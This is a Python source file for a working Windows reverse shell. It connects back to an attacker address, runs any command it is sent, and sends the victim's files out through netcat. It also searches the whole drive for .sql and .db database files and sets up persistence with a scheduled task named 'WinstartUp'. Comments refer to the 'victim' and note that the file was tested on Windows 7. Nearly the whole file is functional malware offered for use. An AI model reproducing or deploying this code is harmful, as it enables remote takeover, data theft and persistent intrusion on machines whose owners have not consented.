import socket
import subprocess
import os
import time

host = '10.0.2.4'
port = 6001
# modified version of win_shell.py
# Tested on Windows 7 - working
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    while True:
        cmd = s.recv(1024)
        cmd = cmd.decode("utf-8")
        if cmd.strip() == 'download' or cmd.strip() == 'Download':
            s.sendall(b'Make sure to listen with netcat on a different port: nc -lvnp <port> > <file-name>\n')
            s.sendall(b'Enter file path:')
            file = s.recv(1024)
            file = file.decode("utf-8")
            try:
                s.sendall(b"Enter port to you're listening on to receive file\n")
                port2 = s.recv(1024)
                port2 = port2.decode('utf-8')
                port2 = port2.strip()
                s.sendall(b'Sending file...\n')
                os.system("nc -w 3 " + host + " " + port2 + " < " + file)
                s.sendall(b'File sent!\n')
            except:
                s.sendall(b'An error occurred, check input & try again\n')
        #uploads don't work due to firewall, we can't connect to victim to send file
        #alternative - upload to anonfile & do a wget, could work
        elif cmd.strip() == "upload" or cmd.strip() == "Upload":
            s.sendall(b'On attacker machine after victim machine is listening: nc -w 3 <victim-ip> <port> < <input-file>\n')
            try:
                cmdOut = subprocess.check_output("ipconfig", shell=True)
                s.sendall(b'victim ip address:\n')
                s.sendall(cmdOut.strip())
                s.sendall(b'\n')
            except subprocess.CalledProcessError as exc:
                result = exc.output
                s.sendall(b'victim ip address:\n')
                s.sendall(result.strip())
                s.sendall(b'\n')
            try:
                s.sendall(b'Enter port to send file to\n')
                vPort = s.recv(1024)
                vPort = vPort.decode('utf-8')
                vport = vPort.strip()
                s.sendall(b'victim machine listening for file upload...\n')
                cmdOut = subprocess.check_output("nc -lvnp " + vPort + " > newFile", shell=True)
                s.sendall(b'File downloaded!\n')
            except subprocess.CalledProcessError as exc:
                result = exc.output
                s.sendall(result.strip())
                s.sendall(b'\n')
                
        elif cmd.strip() == "sql" or cmd.strip() == "SQL":
            try:
                sqlSearch = subprocess.check_output("cd \ && dir/s *.sql", shell=True)
                s.sendall(sqlSearch.strip())
            except subprocess.CalledProcessError as exc:
                result = exc.output
                s.sendall(result.strip())
                s.sendall(b'\n')
            try:
                dbSearch = subprocess.check_output("cd \ && dir/s *.db", shell=True)
                s.sendall(dbSearch.strip())
                s.sendall(b'\n')
            except subprocess.CalledProcessError as exc:
                result = exc.output
                s.sendall(result.strip())
                s.sendall(b'\n')
        #scheduled tasks currently doesn't work due to win7 defaulting to only allowing scheduled tasks to run if machine is connected to power (charging)
        elif cmd.strip() == "schedule" or cmd.strip() == "persist":
            s.sendall(b'NOTE THE SCHEDULED TASK WILL ONLY RUN IF MACHINE IS CONNECTED TO POWER/CHARGING\n')
            try:
                cwd = subprocess.check_output("pwd", shell=True)
                s.sendall(cwd.strip())
                s.sendall(b'\n')
            except subprocess.CalledProcessError as exc:
                result = exc.output
                s.sendall(result.strip())
                s.sendall(b'\n')
            try:
                #this will search for your reverse shell & send you the location of it. you need this to schedule a task
                #here change the file name to whatever you named it before sending it
                s.sendall(b'Enter the name of the exe you originally sent\n')
                nameofFile = s.recv(1024)
                nameofFile = nameofFile.decode('utf-8')
                nameofFile = nameofFile.strip()
                filePath = subprocess.check_output("dir/s " + nameofFile, shell=True)
                s.sendall(filePath.strip())
                s.sendall(b'\n')
            except subprocess.CalledProcessError as exc:
                result = exc.output
                s.sendall(result.strip())
                s.sendall(b'\n')
            s.sendall(b'Enter the path of the reverse shell in order to create a scheduled task\n')
            shellrelativePath = s.recv(1024)
            shellrelativePath = shellrelativePath.decode("UTF-8")
            shellrelativePath = shellrelativePath.strip()
            #cmdOut = "SCHTASKS /CREATE /SC MINUTE /MO 2 /TN 'WIN32STARTUPNOTIONNEW' /TR " + relativePath + " /ST 10:00 /ET 23:00"
            cmdOut = subprocess.check_output('SCHTASKS /CREATE /TN "WinstartUp" /SC MINUTE /TR ' + shellrelativePath + ' /ST 10:00', shell=True)
            s.sendall(b'Task created! SCHTASKS /QUERY to see new task!\n')
        else:
            try:
                cmdOut = subprocess.check_output(cmd, shell=True)
                s.sendall(cmdOut.strip())
                s.sendall(b'\n')
            except subprocess.CalledProcessError as exc:
                result = exc.output
                s.sendall(result.strip())
                s.sendall(b'\n')
            
 
